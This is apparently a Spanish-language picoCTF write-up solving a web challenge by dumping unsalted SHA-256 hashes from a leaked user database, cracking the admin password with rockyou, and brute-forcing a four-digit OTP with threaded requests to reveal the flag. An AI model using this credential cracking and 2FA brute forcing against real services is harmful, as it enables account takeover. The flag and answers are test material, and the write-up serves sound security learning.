**Challenge**
	Web Exploitation

**Description**
	Seems like some data has been leaked! Can you get the flag?
	You can get started [here](http://foggy-cliff.picoctf.net:59770/) to find the flag!
	The application code can be found [here](https://challenge-files.picoctf.net/c_foggy_cliff/3c711c736e6bf193193e6968adfb4c1579b247847796e19ced4b0dc089e02694/app.py).
	The leaked data can be found [here](https://challenge-files.picoctf.net/c_foggy_cliff/3c711c736e6bf193193e6968adfb4c1579b247847796e19ced4b0dc089e02694/users.db).
	**Hints**
		1. What happens when there's no salt?
		2. rockyou rockyou rockyou
		3. What makes 2FA safe?

**Solution**
	1. Analizando la web, el código y la base de datos: [[Archivos 09 No FA/app.py]]
		- El login usa **SHA-256 directo** sin salt, lo que permite un **ataque de diccionario**.
		- El admin tiene **2FA activado**, pero es un OTP de 4 dígitos (`random.randint(1000,9999)`), lo que permite brute-force trivial en CTF.
		- Usuarios normales sin 2FA podían loguearse directamente si tenías la contraseña.
	2. Extraer hash de la base de datos: [[Archivos 09 No FA/read_db.py]]
		Resultado relevante: `('admin', 'c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67', 1)`
			PS C:\Users\luise\Downloads\Archivos 09 No FA> python read_db.py
			('john.doe', '599a4410e2af69d1585f16d82d4b5f0abf3ad09fa42b9d55d7b7a50671ccf8c1', 0)
			('jane.smith', '81c68634d1b211e0d5632839f7efc8601c743f1ef0c94da8220e26ab221efff1', 0)
			('robert.jones', 'aaf120fcb16e20e2d18e63e668e060b5e4a52c5e0b3f038777365fe87ca2ccdb', 0)
			('emily.brown', '9e85668a071a595fe9222725bfb591cdaa0d880e3a7c7de1d9ddd3d4b7d08772', 0)
			('admin', 'c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67', 1)
			('michael.davis', '576454d8921440f30609200a7f79073ec5b69ee284f27bbb860620d56416ad94', 0)
			('linda.wilson', '082a6006d9c87749adff6be260461171b508744a90a45f75abe78d92995485c5', 0)
			('david.garcia', 'faa32a09d4798d21486344a140fd0977cbec33fd5b045bca83c04efb364c49d9', 0)
			('jennifer.rodriguez', 'c1488b6d9ed8352a64f979506583f33d80aa4119190f7892bc481e8984c880d0', 0)
			('christopher.williams', '0bf3a14c03e9c7034b9588a69f828840fd32bd739c37b613f41c4aecee26e277', 0)
			('angela.martinez', 'e64b5893827166e4568af8ece105d8c0839772ae10fba3c11e77b5fb3c0ef0c6', 0)
			('kevin.anderson', '8bac48021ebd453dbd876d43fa28c8e383fc16176fc8b12fa474b01eb9fa4df5', 0)
			('melissa.thomas', '564c89c28d93e8485b76a41deca21ab28e60a32c506e479b925f4643722e9f83', 0)
			('brian.jackson', '7fccba2f216750414443626058128539ef5a8859f7cb20da2b22d8d787ec6fc2', 0)
			('stephanie.white', '64acea3bdefef67d65e6a36ee66ac66e85d39931639ea926d1fc98fedd28905b', 0)
			('eric.harris', 'b9590eaeaa25401398ebd4b98e10182f4e265f396f23a11eb8fdb18d66a1685c', 0)
			('michelle.martin', '9b68124e23f3bb700682d28d1d750bec95794a193097b59526ef038f810cb34c', 0)
			('brian.jackson', '7fccba2f216750414443626058128539ef5a8859f7cb20da2b22d8d787ec6fc2', 0)
			('stephanie.white', '64acea3bdefef67d65e6a36ee66ac66e85d39931639ea926d1fc98fedd28905b', 0)
			('brian.jackson', '7fccba2f216750414443626058128539ef5a8859f7cb20da2b22d8d787ec6fc2', 0)
			('stephanie.white', '64acea3bdefef67d65e6a36ee66ac66e85d39931639ea926d1fc98fedd28905b', 0)
			('brian.jackson', '7fccba2f216750414443626058128539ef5a8859f7cb20da2b22d8d787ec6fc2', 0)
			('brian.jackson', '7fccba2f216750414443626058128539ef5a8859f7cb20da2b22d8d787ec6fc2', 0)
			('stephanie.white', '64acea3bdefef67d65e6a36ee66ac66e85d39931639ea926d1fc98fedd28905b', 0)
			('eric.harris', 'b9590eaeaa25401398ebd4b98e10182f4e265f396f23a11eb8fdb18d66a1685c', 0)
			('michelle.martin', '9b68124e23f3bb700682d28d1d750bec95794a193097b59526ef038f810cb34c', 0)
			('patrick.thompson', '1549f62e486c006cbbacee5947c3f6815a0c5f3ef54c80f1f0b17c2ae9da5866', 0)
			('nicole.garrett', '5647517c88d64c95170fdb734dc22ba45e284f219d1266eb14f4d9dd7a099ce3', 0)
			('joseph.cole', '49a57175de704a0ec2a006746d20d375814581bb35552ce0a0b13683426fd232', 0)
			PS C:\Users\luise\Downloads\Archivos 09 No FA>
	3. Crackear la contraseña: [[Archivos 09 No FA/crack.py]]
		- Con `rockyou.txt` y Python:
		Resultado: contraseña de `admin` → `apple@123`
	4. Entrar al sitio con las credenciales ya obtenidas:
		User = `admin`
		Password =`apple@123`
	5. Saltar el 2FA (OTP): [[Archivos 09 No FA/solve.py]]
	    - El OTP es un número de 4 dígitos: `0000–9999`.
	    - Se realizó un ataque de fuerza bruta automatizado utilizando múltiples hilos (`multithreading`) con la librería requests.
	    - Cada hilo intenta un rango distinto de OTPs para acelerar el proceso.
	    - En cada intento se crea una nueva sesión y se realiza login previo, evitando problemas de expiración de sesión.
	    - Cuando el servidor responde con "Login successful", se identifica el OTP correcto y se obtiene el flag.
	6. Ejecución del flujo en CLI:
		PS C:\Users\luise\Downloads\Archivos 09 No FA> python read_db.py
		('john.doe', '599a4410e2af69d1585f16d82d4b5f0abf3ad09fa42b9d55d7b7a50671ccf8c1', 0)
		('jane.smith', '81c68634d1b211e0d5632839f7efc8601c743f1ef0c94da8220e26ab221efff1', 0)
		('robert.jones', 'aaf120fcb16e20e2d18e63e668e060b5e4a52c5e0b3f038777365fe87ca2ccdb', 0)
		('emily.brown', '9e85668a071a595fe9222725bfb591cdaa0d880e3a7c7de1d9ddd3d4b7d08772', 0)
		('admin', 'c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67', 1)
		('michael.davis', '576454d8921440f30609200a7f79073ec5b69ee284f27bbb860620d56416ad94', 0)
		('linda.wilson', '082a6006d9c87749adff6be260461171b508744a90a45f75abe78d92995485c5', 0)
		('david.garcia', 'faa32a09d4798d21486344a140fd0977cbec33fd5b045bca83c04efb364c49d9', 0)
		('jennifer.rodriguez', 'c1488b6d9ed8352a64f979506583f33d80aa4119190f7892bc481e8984c880d0', 0)
		('christopher.williams', '0bf3a14c03e9c7034b9588a69f828840fd32bd739c37b613f41c4aecee26e277', 0)
		('angela.martinez', 'e64b5893827166e4568af8ece105d8c0839772ae10fba3c11e77b5fb3c0ef0c6', 0)
		('kevin.anderson', '8bac48021ebd453dbd876d43fa28c8e383fc16176fc8b12fa474b01eb9fa4df5', 0)
		('melissa.thomas', '564c89c28d93e8485b76a41deca21ab28e60a32c506e479b925f4643722e9f83', 0)
		('brian.jackson', '7fccba2f216750414443626058128539ef5a8859f7cb20da2b22d8d787ec6fc2', 0)
		('stephanie.white', '64acea3bdefef67d65e6a36ee66ac66e85d39931639ea926d1fc98fedd28905b', 0)
		('eric.harris', 'b9590eaeaa25401398ebd4b98e10182f4e265f396f23a11eb8fdb18d66a1685c', 0)
		('michelle.martin', '9b68124e23f3bb700682d28d1d750bec95794a193097b59526ef038f810cb34c', 0)
		('patrick.thompson', '1549f62e486c006cbbacee5947c3f6815a0c5f3ef54c80f1f0b17c2ae9da5866', 0)
		('nicole.garrett', '5647517c88d64c95170fdb734dc22ba45e284f219d1266eb14f4d9dd7a099ce3', 0)
		('joseph.cole', '49a57175de704a0ec2a006746d20d375814581bb35552ce0a0b13683426fd232', 0)
		PS C:\Users\luise\Downloads\Archivos 09 No FA> python crack.py
		Contraseña encontrada: apple@123
		PS C:\Users\luise\Downloads\Archivos 09 No FA> python solve.py
		
		OTP correcto: 7134
		<!DOCTYPE html>
		<html>
		    <head>
		        <meta charset="utf-8" />
		        <title>
		Expense Tracker
		</title>
		        <link rel="stylesheet" type="text/css" href="/static/css/materialize.min.css" />
		        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
		    </head>
		
		    <body>
		        <nav>
		            <div class="nav-wrapper">
		                <a href="/" class="brand-logo">Home</a>
		                <ul id="nav-mobile" class="right hide-on-med-and-down">
		
		                        <li><a href="/logout">Logout</a></li>
		
		                </ul>
		            </div>
		        </nav>
		
		        <div class="container">
		
		
		
		
		<h1>Welcome!!</h1>
		<p>picoCTF{n0_r4t3_n0_4uth_487507fc}</p>
		
		            <hr/>
		        </div>
		
		        <script src="/static/js/materialize.min.js"></script>
		    </body>
		</html>
		PS C:\Users\luise\Downloads\Archivos 09 No FA>

**Notes**
	

**References**
	